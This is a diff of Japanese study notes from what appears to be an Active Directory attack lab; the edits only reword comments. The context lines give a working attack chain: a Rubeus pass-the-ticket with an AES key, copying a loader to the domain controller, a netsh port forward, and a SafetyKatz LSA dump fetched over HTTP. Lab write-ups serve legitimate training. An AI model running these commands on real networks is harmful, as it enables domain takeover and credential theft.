@@ -294,14 +294,16 @@ whoami /groups | findstr "Domain Admins"
 管理者としてコマンドプロンプトを起動
 ```bash
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt	
-# DA権限を持つプロンプトが起動
+# DA権限を持つプロンプトが起動する
 
 # Loaderをdcに配置
 echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y	
 
 # dcに接続
 winrs -r:dcorp-dc cmd		
-netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48	# ポートフォワード設定
+
+# ポートフォワード設定
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48	
 
 C:\Users\Public\Loader.exe --obfuscate false -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"	
 # 文字化けが発生するときはHFSを起動していないか学生VMのファイアーウォールがONになっている。
@@ -357,7 +359,7 @@ DCのLSASSプロセスにパッチを当てることであらゆるユーザー�
 ```bash
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
-・新しいプロンプトが開く
+・上記のコマンドでDA権限を持つ新しいプロンプトが開く
 ```bash
 
 # Loaderを配置
